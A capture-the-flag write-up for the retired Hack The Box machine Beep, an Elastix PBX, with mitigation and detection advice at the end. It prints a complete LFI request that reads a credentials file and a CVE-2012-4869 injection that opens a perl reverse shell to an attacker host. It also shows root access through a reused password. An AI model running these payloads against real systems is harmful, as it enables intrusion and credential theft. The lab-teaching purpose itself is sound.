---
machine: Beep
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, elastix, freepbx, lfi, cve, sudo]
---

# Beep — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An Elastix PBX with FreePBX, Webmin and a pile of mail services. An LFI in `vtigercrm/graph.php` reads `/etc/amportal.conf` and hands over the database, panel and Asterisk passwords. With a valid extension, CVE-2012-4869 in `callme_page.php` runs commands as `asterisk`. Escalation reuses that password: it is also `root`'s SSH password (legacy algorithms must be enabled on the client).

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH 4.3
25/tcp    smtp
80/tcp    http    Apache 2.2.3 (CentOS) → redirect to 443
110/tcp   pop3
111/tcp   rpcbind
143/tcp   imap
443/tcp   ssl/http Apache 2.2.3
993/tcp   imaps
995/tcp   pop3s
3306/tcp  mysql
4445/tcp  unknown
10000/tcp http    Webmin 1.570 (MiniServ)
```

That combination (mail + panel + MySQL + Webmin) is the Elastix signature. The server only speaks SSLv3/TLS 1.0, so modern tooling fails by default.

## Enumeration

```bash
curl -k -I https://<IP>/
curl -k -s https://<IP>/ | grep -i elastix
```

```bash
searchsploit elastix
searchsploit -x php/webapps/37637.pl
```

The `vtigercrm` LFI reads files without authentication:

```bash
curl -k --path-as-is \
  "https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
```

```text
AMPDBPASS=<dbpass>
AMPMGRPASS=<mgrpass>
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=<panelpass>
```

Those credentials open the panel (`https://<IP>/`), where extensions can be listed; a valid one (for example `233`) is needed for the next step.

## Foothold

CVE-2012-4869: `recordings/misc/callme_page.php` builds an Asterisk call from unsanitised parameters, so a dialplan application (`System`) can be injected to run a command.

```bash
nc -lvnp 4445
```

```bash
curl -k --tls-max 1.0 --ciphers 'AES128-SHA' -1 \
  "https://<IP>/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20'%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22<ATTACKER>%3a4445%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b'%0D%0A%0D%0A"
```

The connection lands as `asterisk`. Stabilise:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

If the client refuses the certificate or protocol, lower OpenSSL's global security on the attacker box (`MinProtocol = None`, `CipherString = DEFAULT@SECLEVEL=0`) and revert it afterwards.

## Escalation

```bash
sudo -l
```

```text
User asterisk may run the following commands on beep:
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    ...
```

The direct route, and the one reference writeups document, is the `amportal.conf` password reused for `root`:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-dss root@<IP>
# password: <the one from amportal.conf>
```

Other doors on the same host: Webmin 1.570 on 10000 and ShellShock against the old CGIs. The `sudo` rules on `nmap`, `yum` or `touch` are a second door but **not** one to assume: `nmap`'s `--interactive` mode was removed in later releases; check `nmap --version` before relying on it.

## Evidence

- `id` as `asterisk`, then as `root`.
- `/etc/amportal.conf` with passwords redacted.
- `user.txt` under `/home/fanis` and `root.txt` read (redacted).

## Lessons learned

- Appliances (Elastix, FreePBX) accumulate old panels and services: `searchsploit` on the product beats hunting per-service CVEs.
- An LFI that reads configuration turns a read-only bug into credentials for several systems.
- TLS 1.0 forces client tweaks; know how to do it without breaking the rest of the lab.
- The panel password reused for `root` is the short escalation; `sudo` on `nmap`/`yum` is a second door, but interactive mode no longer exists in recent releases.
- Panel extensions are exploit input: enumerate them before firing.

## Mitigations and detection

- Patch Elastix/FreePBX and drop `vtigercrm` if unused; the LFI is from 2012 and still lives on unpatched installs.
- Restrict `recordings/misc/callme_page.php` and validate `callmenum` against real extensions.
- Remove `nmap`, `yum` and friends from sudoers; if required, pin arguments.
- Disable TLS 1.0/1.1 and SSLv3 on the server.
- Detection: requests to `graph.php?current_language=` containing `../`, outbound calls from Asterisk, `nmap` spawned by `asterisk`.
- MITRE: T1005 (local data), T1190, T1548.003.

## References

- CVE-2012-4869 (FreePBX `callme_page.php`).
- GTFOBins: `nmap`.
- MITRE ATT&CK: T1190, T1548.003.
